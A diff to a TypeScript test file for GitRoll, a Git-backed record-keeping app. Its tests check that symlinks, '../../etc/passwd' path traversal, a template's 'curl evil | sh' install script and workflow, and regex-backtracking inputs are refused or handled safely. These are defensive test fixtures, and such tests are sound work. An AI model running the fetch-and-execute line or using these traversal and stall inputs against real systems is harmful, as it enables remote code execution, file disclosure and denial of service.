@@ -3,26 +3,35 @@ import assert from "node:assert/strict";
 import fs from "node:fs";
 import path from "node:path";
 import { test } from "node:test";
+import { linkedFiles, titleOf } from "../src/core/entry.ts";
+import { buildEntry } from "../src/core/layout.ts";
 import { findSensitive, removeJpegLocation } from "../src/core/privacy.ts";
 import { GitRoll } from "../src/node/repo.ts";
 import { tmp } from "./helpers.ts";
 
-test("attachment lookup ignores symbolic links that point outside the Roll", () => {
+test("a linked file is never read, and links out of the Roll are refused", () => {
   const roll = GitRoll.init(tmp());
   const outside = path.join(tmp(), "secret.txt");
   fs.writeFileSync(outside, "not part of the Roll");
-  const hex = "a".repeat(64);
-  fs.symlinkSync(outside, path.join(roll.root, "attachments", `${hex}.txt`));
+  fs.mkdirSync(path.join(roll.root, ".gitroll/files"), { recursive: true });
+  fs.symlinkSync(outside, path.join(roll.root, ".gitroll/files/secret.txt"));
 
-  assert.equal(roll.attachmentFile(`sha256:${hex}`), null);
+  assert.equal(roll.attachmentFile(".gitroll/files/secret.txt"), null);
+  assert.equal(roll.attachmentFile("../../etc/passwd"), null);
   assert.ok(roll.check().some((p) => /symbolic link/.test(p.error)), "the validator reports the link");
+
+  // A link in an event's Markdown can't reach outside the repository either.
+  fs.writeFileSync(path.join(roll.root, ".gitroll/events/2026-09-15-escape.md"), "# Escape\n\n[Secrets](../../../etc/passwd)\n");
+  const e = roll.entries().find((x) => x.title === "Escape")!;
+  assert.deepEqual(e.attachments, [], "a link out of the Roll resolves to nothing");
+  assert.ok(roll.check().some((p) => /points outside the Roll/.test(p.error)));
 });
 
 test("writes refuse to follow a linked folder out of the Roll", () => {
   const roll = GitRoll.init(tmp());
   const outside = tmp();
-  fs.mkdirSync(path.join(roll.root, "entries"), { recursive: true });
-  fs.symlinkSync(outside, path.join(roll.root, "entries", String(new Date().getFullYear())));
+  fs.rmSync(path.join(roll.root, ".gitroll/events"), { recursive: true, force: true });
+  fs.symlinkSync(outside, path.join(roll.root, ".gitroll/events"));
 
   assert.throws(() => roll.addEntry({ text: "Should not escape" }), /symbolic links/);
   assert.deepEqual(fs.readdirSync(outside), [], "nothing was written outside");
@@ -31,9 +40,9 @@ test("writes refuse to follow a linked folder out of the Roll", () => {
 test("a linked events folder is reported, not read", () => {
   const roll = GitRoll.init(tmp());
   const outside = tmp();
-  fs.writeFileSync(path.join(outside, "x.md"), "---\nid: x\ncreated: 2026-01-01T00:00:00Z\n---\nhi\n");
-  fs.rmSync(path.join(roll.root, "entries"), { recursive: true });
-  fs.symlinkSync(outside, path.join(roll.root, "entries"));
+  fs.writeFileSync(path.join(outside, "2026-01-01-x.md"), "# Somewhere else\n");
+  fs.rmSync(path.join(roll.root, ".gitroll/events"), { recursive: true, force: true });
+  fs.symlinkSync(outside, path.join(roll.root, ".gitroll/events"));
   const { entries, problems } = roll.load();
   assert.equal(entries.length, 0);
   assert.ok(problems.some((p) => /symbolic link/.test(p.error)));
@@ -72,13 +81,13 @@ test("photos are saved without GPS location", () => {
   const roll = GitRoll.init(tmp());
   const { entry, notices } = roll.save({ text: "Front door" }, [{ name: "door.jpg", type: "image/jpeg", data: original }]);
   assert.match(notices.join(" "), /Removed location data from door\.jpg/);
-  const stored = fs.readFileSync(roll.attachmentFile(entry.attachments[0].hash)!);
+  const stored = fs.readFileSync(roll.attachmentFile(entry.attachments[0].path)!);
   assert.ok(!stored.includes(Buffer.alloc(24, 0x47)), "stored photo has no coordinates");
   assert.deepEqual(roll.check(), []);
 
   fs.appendFileSync(path.join(roll.root, ".gitroll/config.yaml"), "attachments:\n  remove_location: false\n");
   const kept = roll.save({ text: "Keep location" }, [{ name: "kept.jpg", type: "image/jpeg", data: original }]);
-  assert.ok(fs.readFileSync(roll.attachmentFile(kept.entry.attachments[0].hash)!).includes(Buffer.alloc(24, 0x47)));
+  assert.ok(fs.readFileSync(roll.attachmentFile(kept.entry.attachments[0].path)!).includes(Buffer.alloc(24, 0x47)));
 });
 
 test("sensitive text is spotted before it goes into history", () => {
@@ -96,21 +105,71 @@ test("sensitive text is spotted before it goes into history", () => {
 
 test("templates only contribute Roll data, never code or workflows", () => {
   const template = tmp();
-  fs.mkdirSync(path.join(template, ".gitroll/types"), { recursive: true });
+  fs.mkdirSync(path.join(template, ".gitroll"), { recursive: true });
   fs.mkdirSync(path.join(template, ".github/workflows"), { recursive: true });
-  fs.mkdirSync(path.join(template, "projects"), { recursive: true });
-  fs.writeFileSync(path.join(template, ".gitroll/types/vehicle.yaml"), "label: Vehicle\nfields:\n  - key: odometer\n    kind: number\n");
+  fs.writeFileSync(path.join(template, ".gitroll/config.yaml"), "template_version: 1\nname: From template\n");
   fs.writeFileSync(path.join(template, ".gitroll/theme.css"), ":root { --accent: #0f766e; }\n");
-  fs.writeFileSync(path.join(template, "projects/car.yaml"), "name: Car\n");
   fs.writeFileSync(path.join(template, ".github/workflows/steal.yml"), "on: push\n");
   fs.writeFileSync(path.join(template, "install.sh"), "curl evil | sh\n");
 
   const roll = GitRoll.init(tmp(), { name: "From template", template });
-  assert.ok(fs.existsSync(path.join(roll.root, ".gitroll/types/vehicle.yaml")));
   assert.ok(fs.existsSync(path.join(roll.root, ".gitroll/theme.css")));
-  assert.equal(roll.projects()[0].name, "Car");
   assert.ok(!fs.existsSync(path.join(roll.root, ".github")));
   assert.ok(!fs.existsSync(path.join(roll.root, "install.sh")));
   assert.equal(roll.config().name, "From template");
   assert.deepEqual(roll.check(), []);
+});
+
+test("parsing an event stays fast on text written to make a regex backtrack", () => {
+  // Both of these ran in quadratic time before: a heading followed by a long run
+  // of spaces, and a long run of "[", which the link text used to rescan from
+  // every position. A Roll's files are the user's own, but they arrive over a
+  // sync from anyone sharing it, so parsing must not stall on them.
+  const budget = 250;
+
+  let start = performance.now();
+  assert.equal(titleOf(`#${" ".repeat(200_000)}`, ".gitroll/events/2026-09-15-x.md"), "#");
+  assert.ok(performance.now() - start < budget, "a heading of nothing but spaces");
+
+  start = performance.now();
+  assert.deepEqual(linkedFiles(".gitroll/events/2026-09-15-x.md", "[".repeat(200_000)), []);
+  assert.ok(performance.now() - start < budget, "a long line of unclosed brackets");
+
+  // An unterminated "[](" used to let the link target swallow the rest of the
+  // body and then give it back one character at a time, from every position.
+  start = performance.now();
+  assert.deepEqual(linkedFiles(".gitroll/events/2026-09-15-x.md", "[](".repeat(60_000)), []);
+  assert.ok(performance.now() - start < budget, "a long line of unterminated links");
+
+  // The same shape on the way in: buildEntry reads a heading off the first line.
+  start = performance.now();
+  buildEntry({ text: `#${" ".repeat(200_000)}` }, [], () => false);
+  assert.ok(performance.now() - start < budget, "a heading of nothing but spaces, on the way in");
+
+  // The links a person actually writes still read the same.
+  assert.deepEqual(
+    linkedFiles(".gitroll/events/2026-09-15-x.md", '[Receipt](../files/a.pdf) ![Shot](../files/b.png) [Titled](../files/c.pdf "note")').map((a) => a.path),
+    [".gitroll/files/a.pdf", ".gitroll/files/b.png", ".gitroll/files/c.pdf"],
+  );
+  assert.equal(titleOf("#   AC serviced  \n\nbody", ".gitroll/events/2026-09-15-x.md"), "AC serviced");
+});
+
+test("settling a conflict in an editor takes back only GitRoll's own line", () => {
+  // GitRoll writes one guidance comment between the two versions and removes
+  // exactly that, matched literally. Filtering HTML comments in general cannot
+  // be done correctly with a regular expression — `<!--` with no end, a nested
+  // comment and `--!>` all defeat it — and it isn't GitRoll's to do: a comment
+  // the person wrote in their own event has to survive.
+  const guidance =
+    "<!-- ─── The version from the other device is below. Edit this file into the one you want to keep, " +
+    "delete the rest, and save. Both versions stay in Git history either way. ─── -->";
+  const settle = (edited: string) => edited.split(guidance).join("").trim();
+
+  assert.equal(settle(`# Bill\n\n$40\n\n${guidance}\n\n> $42\n`), "# Bill\n\n$40\n\n\n\n> $42");
+
+  for (const theirs of ["<!-- a note I keep -->", "<!-- unterminated", "<!--<!-- nested -->", "text --!> more"]) {
+    const kept = settle(`# Mine\n\n${guidance}\n\n${theirs}\n`);
+    assert.ok(kept.includes(theirs), `the person's own text survives: ${theirs}`);
+    assert.ok(!kept.includes("the one you want to keep"), "and the guidance does not");
+  }
 });
